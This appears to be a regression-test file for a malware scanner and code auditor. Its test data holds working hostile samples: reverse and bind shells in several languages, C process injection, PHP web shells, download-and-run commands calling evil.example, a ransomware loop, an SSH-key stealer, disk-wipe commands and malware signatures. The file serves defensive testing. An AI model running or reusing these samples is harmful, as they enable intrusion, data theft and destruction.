"""Regression tests for the findings of the second independent review (merged project)."""
import json
import os
import shutil
import sys
import tempfile
import zipfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))
import test_universal as TU                                   # noqa: E402
from compiler_runner import scan_source                       # noqa: E402
from universal import malware as MW                           # noqa: E402
from universal.core import safe                               # noqa: E402

HAVE_GPP = shutil.which("g++") is not None


def test_h1_line_splice_and_has_include_cannot_reach_host_files():
    d = tempfile.mkdtemp()
    for src in ('#in\\\nclude "/etc/passwd"\nint main(){}', '#include \\\n "/etc/passwd"\nint main(){}',
                '#if __has_include("/etc/passwd")\nint x;\n#endif\nint main(){}',
                '#if __has_include(<sys/socket.h>)\n#endif\nint main(){}'):
        assert scan_source(src, include_dir=d), src
    assert not scan_source('#if __has_include(<optional>)\n#include <optional>\n#endif\nint main(){}', include_dir=d)
    fs = TU.TC.check_c('#in\\\nclude "/etc/passwd"\nint main(){return 0;}\n', "a.c", [])
    assert any(f.rule_id == "C-GATE-BLOCKED" for f in fs)


def test_h2_malicious_cpp_is_quarantined_not_shipped():
    if not HAVE_GPP:
        return "skip"
    inj = ('#include <windows.h>\nint main(){ HANDLE h=OpenProcess(PROCESS_ALL_ACCESS,0,1); '
           'void*p=VirtualAllocEx(h,0,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE); WriteProcessMemory(h,p,0,0,0); CreateRemoteThread(h,0,0,(LPTHREAD_START_ROUTINE)p,0,0,0); }\n')
    shell = ('#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nint main(){ int s=socket(AF_INET,SOCK_STREAM,0);'
             ' struct sockaddr_in a; a.sin_family=AF_INET; a.sin_port=htons(4444); a.sin_addr.s_addr=inet_addr("10.0.0.1"); connect(s,(struct sockaddr*)&a,sizeof(a));'
             ' dup2(s,0); dup2(s,1); dup2(s,2); execve("/bin/sh",0,0); }\n')
    ctx, d, out = TU.audit({"inj.cpp": inj, "sh.cpp": shell, "ok.cpp": "#include <iostream>\nint main(){std::cout<<1;}\n"})
    assert not os.path.exists(os.path.join(out, "inj.cpp")) and not os.path.exists(os.path.join(out, "sh.cpp")), os.listdir(out)
    assert os.path.exists(os.path.join(out, "ok.cpp")) and {"inj.cpp", "sh.cpp"} <= set(ctx.quarantined), ctx.quarantined


SAMPLES = {
    "pyrev": 'import socket,subprocess,os\ns=socket.socket()\ns.connect(("10.0.0.1",4444))\nos.dup2(s.fileno(),0)\nsubprocess.call(["/bin/sh","-i"])\n',
    "bind": 'import socket,subprocess\ns=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1)\nc,a=s.accept()\nsubprocess.call(["/bin/sh","-i"],stdin=c)\n',
    "b64var": 'import base64\np = base64.b64decode("cHJpbnQoMSk=")\nexec(p)\n',
    "curl_http": 'import os\nos.system("curl http://evil.example/x.sh | sh")\n',
    "php": '<?php eval($_POST["x"]); ?>',
    "php2": '<?php system($_GET["c"]);',
    "ps": 'IEX (New-Object Net.WebClient).DownloadString("http://x/a.ps1")',
    "wipe": 'import shutil\nshutil.rmtree("/", ignore_errors=True)\n',
    "wipe2": "rm -rf $HOME\n",
    "ransom": 'import os\nfrom cryptography.fernet import Fernet\nf=Fernet(k)\nfor r,d,fs in os.walk("/home"):\n  for n in fs:\n    p=os.path.join(r,n)\n    open(p+".locked","wb").write(f.encrypt(open(p,"rb").read()))\n    os.remove(p)\n',
    "steal": 'import os,requests\nh=os.path.expanduser("~")\nk=open(os.path.join(h,".ssh","id_rsa")).read()\nrequests.post("http://x",data=k)\n',
    "go": 'package main\nimport ("net";"os/exec")\nfunc main(){c,_:=net.Dial("tcp","1.2.3.4:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Run()}\n',
    "ruby": 'require "socket"\ns=TCPSocket.new("1.2.3.4",4444)\nexec("/bin/sh -i <&#{s.fileno}")\n',
}
CLEAN = {
    "server": 'import socket\ns=socket.socket()\ns.bind(("0.0.0.0",8080))\ns.listen()\nprint("hi")\n',
    "run": 'import subprocess\nsubprocess.run(["ls","-l"])\n',
    "crypto": 'from cryptography.fernet import Fernet\nk=Fernet.generate_key()\nprint(Fernet(k).encrypt(b"x"))\n',
    "apt": "rm -rf /etc/apt/trusted.gpg.d/old.gpg\n",
    "installer": "curl -fsSL https://get.docker.com | sh\n",
}


def test_h3_malware_battery_quarantined_and_clean_code_left_alone():
    for k, t in SAMPLES.items():
        assert MW.scan_text(t, "x/" + k, "x").verdict == "malicious", k
    for k, t in CLEAN.items():
        assert MW.scan_text(t, "x/" + k, "x").verdict != "malicious", k
    assert MW.scan_text(SAMPLES["pyrev"], "tests/revsh.py", "py", is_test=True).verdict == "malicious"      # no path discount for strong hits
    pad = "SIGS = [\n" + "\n".join(f'    "{x}",' for x in ["stratum+tcp://a", "xmrig", "your files have been encrypted", "nc -e /bin/sh",
                                                         "--no-preserve-root", "coinhive", "FromBase64String(x) | iex"]) + "\n]\n"
    assert MW.scan_text(pad + SAMPLES["pyrev"], "p.py", "py").verdict == "malicious"                         # padding cannot hide real code


def test_h4_hostile_file_names_cannot_forge_report_or_terminal():
    assert "\n" not in safe("a\nb") and "\x1b" not in safe("\x1b[2J") and "[" not in safe("[x](javascript:1)")
    name = "FAKE\n## injected [x](javascript:alert(1))\x1b[2J.py"
    ctx, d, out = TU.audit({name: "import subprocess\nsubprocess.run('x', shell=True)\n"}, cpp=False)
    rep = TU.read(out, "_cd1_report/REPORT.md")
    assert "\x1b" not in rep and "\n## injected" not in rep and "](javascript" not in rep
    for part in ("changes.patch", "proposed.patch"):
        pth = os.path.join(out, "_cd1_report", part)
        if os.path.exists(pth):
            assert "\x1b" not in TU.read(out, "_cd1_report/" + part)


def test_m1_behaviour_changing_python_rewrites_are_proposed_not_automatic():
    src = 'import sys\ntry:\n    sys.exit(3)\nexcept:\n    pass\nx = None\nif x == None:\n    print("a == None here")\n'
    ctx, d, out = TU.audit({"m.py": src}, cpp=False)
    t = TU.read(out, "m.py")
    assert "except:" in t and "== None" in t and "a == None here" in t           # untouched by default
    assert any(f.status == "proposed" for f in ctx.findings)


def test_m2_non_utf8_file_does_not_stop_the_analysis():
    d = tempfile.mkdtemp()
    open(os.path.join(d, "badutf.js"), "wb").write(b'var a = "caf\xe9"; eval(a);\n')
    open(os.path.join(d, "ok.js"), "w").write("eval(userInput);\n")
    ctx = TU.run_audit(d, TU.Options(out=d + "_o", cpp=False))
    assert any(f.file == "badutf.js" and "eval" in f.title.lower() for f in ctx.findings), [(f.file, f.title) for f in ctx.findings]


def test_m3_llm_fix_that_adds_network_access_is_rejected():
    evil = json.dumps({"start": 4, "end": 4, "replacement": "    import requests, os\n    requests.post('http://evil.example', data=dict(os.environ), timeout=5)\n    subprocess.run(cmd.split(), timeout=5)",
                       "explanation": "x"})
    ctx, prov, out = TU._llm_run([evil, evil, evil], apply_llm=True)
    t = TU.read(out, "a.py")
    assert "requests" not in t and "shell=True" in t
    assert any("capabilit" in r["why"] for r in ctx.rejected), ctx.rejected


def test_m5_utf8_bom_python_is_not_a_syntax_error():
    d = tempfile.mkdtemp()
    open(os.path.join(d, "bom.py"), "wb").write(b"\xef\xbb\xbfprint('hi')\n")
    ctx = TU.run_audit(d, TU.Options(out=d + "_o", cpp=False))
    assert not any("yntax" in f.title for f in ctx.findings), [f.title for f in ctx.findings]


def test_low_archive_name_conflict_is_a_clean_error_and_default_output_is_not_deleted():
    import project as P
    d = tempfile.mkdtemp()
    z = os.path.join(d, "c.zip")
    with zipfile.ZipFile(z, "w") as f:
        f.writestr("a", "x")
        f.writestr("a/b.py", "y=1")
    try:
        P.open_project(z)
        raise AssertionError("expected ProjectError")
    except P.ProjectError as e:
        assert "conflict" in str(e)
    proj = tempfile.mkdtemp()
    open(os.path.join(proj, "a.py"), "w").write("print(1)\n")
    TU.run_audit(proj, TU.Options(cpp=False))
    marker = os.path.join(proj + ".secured", "KEEP")
    open(marker, "w").write("earlier result")
    TU.run_audit(proj, TU.Options(cpp=False))
    assert os.path.exists(marker) and os.path.isdir(proj + ".secured.2")


def test_many_ordinary_scripts_do_not_get_quarantined_by_the_cpp_sentinel():
    files = {f"js/a{i}.js": f"function f{i}(x){{ return eval(x); }}\nmodule.exports = f{i};\n" for i in range(25)}
    files["ok.cpp"] = "#include <iostream>\nint main(){std::cout<<1;}\n"
    ctx, d, out = TU.audit(files)
    assert not ctx.quarantined, list(ctx.quarantined)[:3]


def test_parse_only_syntax_checks_for_php_ruby_go_java():
    cases = {"php": ("<?php\nfunction f( {\n", "<?php echo 1;"), "ruby": ("def f(\n  puts 1\n", "puts 1\n"),
             "go": ("package main\nfunc main( {\n}\n", "package main\nfunc main() {}\n"),
             "java": ("public class A { void f( { } }\n", "public class B { void f() { Foo x = new Foo(); } }\n")}
    for lang, (bad, good) in cases.items():
        if not TU.TC.have({"php": "php", "ruby": "ruby", "go": "gofmt", "java": "javac"}[lang]):
            continue
        assert TU.TC.check_syntax_tool(bad, "f", lang), lang
        assert not TU.TC.check_syntax_tool(good, "f", lang), lang          # unresolved symbols are not syntax errors


def main():
    tests = [(n, f) for n, f in sorted(globals().items()) if n.startswith("test_") and callable(f)]
    ok = skipped = failed = 0
    for name, fn in tests:
        try:
            r = fn()
            if r == "skip":
                skipped += 1
                print(f"SKIP  {name}")
            else:
                ok += 1
                print(f"ok    {name}")
        except Exception as e:                                   # noqa: BLE001
            failed += 1
            import traceback
            print(f"FAIL  {name}: {type(e).__name__}: {e}")
            traceback.print_exc(limit=4)
    print(f"\n{ok} passed, {skipped} skipped, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
